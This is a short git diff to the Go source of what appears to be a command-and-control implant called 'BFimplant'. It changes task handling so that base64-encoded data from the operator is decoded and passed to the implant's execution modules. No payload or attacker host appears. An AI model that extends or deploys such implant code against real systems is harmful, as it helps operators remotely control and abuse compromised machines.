@@ -14,6 +14,7 @@ import (
 	"time"
 	"BFimplant/modules"
 	"github.com/google/uuid"
+	"encoding/base64"
 )
 
 type Implant struct {
@@ -29,7 +30,7 @@ type Task struct {
 	ImplantID string   `json:"implant_id"`
 	TaskType  string   `json:"task_type"`
 	Command   string   `json:"cmd"`
-	Data      []byte   `json:"data"`
+	Data      string   `json:"data"`
 }
 
 
@@ -160,8 +161,11 @@ func (i *Implant) executeTask(task Task) (string, error) {
 		return "", fmt.Errorf("module %s not found", moduleName)
 	}
 
-	// Execute module command
-result, err := module.Execute(task.Command,nil)
+	var file_data []byte
+	if task.Data != "" {
+		file_data,_ =  base64.StdEncoding.DecodeString(task.Data)
+	}
+	result, err := module.Execute(task.Command,file_data)
 	if err != nil {
 		return "", fmt.Errorf("error executing module %s: %v", moduleName, err)
 	}
